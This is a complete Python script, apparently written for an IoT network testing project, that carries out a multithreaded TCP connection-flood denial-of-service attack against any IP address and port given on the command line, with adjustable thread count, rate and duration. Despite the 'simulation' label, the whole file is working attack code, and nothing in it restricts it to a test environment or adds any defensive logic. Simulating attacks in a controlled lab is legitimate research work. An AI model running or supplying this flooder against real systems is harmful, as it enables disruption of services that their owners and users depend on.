#!/usr/bin/env python
"""
DDoS attack simulation for IoT network
"""

import argparse
import socket
import threading
import time
import random
import logging
import sys

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('ddos_attack')

class DDoSAttack:
    """
    Simulates a DDoS attack on a target server
    """
    def __init__(self, target_ip, target_port=8000, num_threads=10, 
                 attack_duration=60, attack_rate=1000):
        """
        Initialize the DDoS attack simulation
        
        Args:
            target_ip: Target IP address
            target_port: Target port number
            num_threads: Number of attack threads to spawn
            attack_duration: Duration of attack in seconds
            attack_rate: Packets per second per thread
        """
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_threads = num_threads
        self.attack_duration = attack_duration
        self.attack_rate = attack_rate
        self.running = False
        self.threads = []
        self.start_time = None
        self.packets_sent = 0
        
        logger.info(f"DDoS attack initialized targeting {target_ip}:{target_port}")
        logger.info(f"Attack parameters: {num_threads} threads, "
                    f"{attack_duration}s duration, {attack_rate} packets/s per thread")
    
    def attack_thread(self, thread_id):
        """
        Thread function for launching attack packets
        
        Args:
            thread_id: Identifier for this thread
        """
        logger.info(f"Thread {thread_id} starting attack")
        
        # Create a socket for this thread
        while self.running:
            try:
                # Create a new socket for each connection attempt
                # This is more realistic as DDoS attacks typically open many connections
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)  # Short timeout
                
                # Attempt to connect
                try:
                    sock.connect((self.target_ip, self.target_port))
                    
                    # Send random data
                    attack_data = self._generate_attack_payload()
                    sock.send(attack_data)
                    
                    # Increment counter
                    self.packets_sent += 1
                    
                except (socket.timeout, ConnectionRefusedError):
                    # Connection failed - expected during DDoS
                    pass
                finally:
                    # Close socket
                    try:
                        sock.close()
                    except:
                        pass
                
                # Throttle to achieve target rate
                sleep_time = 1.0 / self.attack_rate
                time.sleep(sleep_time)
                
            except Exception as e:
                logger.error(f"Thread {thread_id} error: {e}")
            
            # Check if attack duration exceeded
            if self.start_time and time.time() - self.start_time > self.attack_duration:
                break
        
        logger.info(f"Thread {thread_id} finished attack")
    
    def _generate_attack_payload(self):
        """
        Generate random payload data for attack packets
        
        Returns:
            bytes: Random binary data
        """
        # Generate random data between 64 and 1024 bytes
        size = random.randint(64, 1024)
        data = bytearray(random.getrandbits(8) for _ in range(size))
        return data
    
    def start(self):
        """
        Start the DDoS attack
        """
        logger.info(f"Starting DDoS attack on {self.target_ip}:{self.target_port}")
        
        self.running = True
        self.start_time = time.time()
        self.packets_sent = 0
        
        # Start attack threads
        for i in range(self.num_threads):
            thread = threading.Thread(
                target=self.attack_thread,
                args=(i,)
            )
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
        
        # Wait for attack duration
        try:
            time.sleep(self.attack_duration)
        except KeyboardInterrupt:
            logger.info("Attack interrupted by user")
        finally:
            self.stop()
    
    def stop(self):
        """
        Stop the DDoS attack
        """
        logger.info("Stopping DDoS attack")
        
        self.running = False
        
        # Wait for threads to finish
        for thread in self.threads:
            thread.join(timeout=2)
        
        # Calculate attack statistics
        duration = time.time() - self.start_time if self.start_time else 0
        rate = self.packets_sent / duration if duration > 0 else 0
        
        logger.info(f"Attack finished: {self.packets_sent} packets sent in {duration:.2f}s "
                    f"({rate:.2f} packets/s)")

def parse_args():
    """
    Parse command line arguments
    
    Returns:
        Parsed arguments
    """
    parser = argparse.ArgumentParser(description='DDoS Attack Simulation')
    
    parser.add_argument('--target', type=str, required=True,
                        help='Target IP address')
    parser.add_argument('--port', type=int, default=8000,
                        help='Target port number')
    parser.add_argument('--threads', type=int, default=10,
                        help='Number of attack threads')
    parser.add_argument('--duration', type=int, default=60,
                        help='Attack duration in seconds')
    parser.add_argument('--rate', type=int, default=100,
                        help='Attack rate (packets per second per thread)')
    
    return parser.parse_args()

def main():
    """
    Main function to run the DDoS attack
    """
    args = parse_args()
    
    # Create and start attack
    attack = DDoSAttack(
        target_ip=args.target,
        target_port=args.port,
        num_threads=args.threads,
        attack_duration=args.duration,
        attack_rate=args.rate
    )
    
    attack.start()

if __name__ == "__main__":
    main() 